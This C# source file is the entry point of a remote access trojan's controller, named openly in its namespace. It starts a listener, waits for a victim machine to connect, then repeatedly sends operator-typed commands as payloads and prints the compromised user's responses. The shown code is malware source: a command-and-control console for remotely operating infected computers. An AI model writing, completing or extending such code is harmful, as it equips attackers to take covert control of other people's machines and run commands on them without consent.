using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Company.Tools.RemoteAccessTrojan.Application;
using Company.Tools.RemoteAccessTrojan.Infrastructure.CrossCutting;
using System.Threading;

namespace Company.Tools.RemoteAccessTrojan.Client
{
    class Program
    {
        static void Main(string[] args)
        {
            using (var terminal = new Terminal())
            {
                try
                {
                    Config.Current = Config.Parse(args);

                    var service = new ApplicationServiceFactory().Create();
                    var listener = service.StartListener();

                    listener.ConnectionEstablished += (sender, e) =>
                    {
                        string input;
                        while ((input = terminal.RequestInput("{0}: ", Environment.UserName)) != "exit")
                        {
                            var response = service.SendPayload(listener, e.Connection.Identifier, input);
                            terminal.WriteOutputLine("{0}: {1}", e.Connection.Username, response);
                        }

                        service.StopListener(listener);
                        terminal.Stop();
                    };

                    terminal.Start("Waiting for connections...");
                }
                catch (Exception ex)
                {
                    terminal.WriteError(ex);
                }
            }
        }
    }
}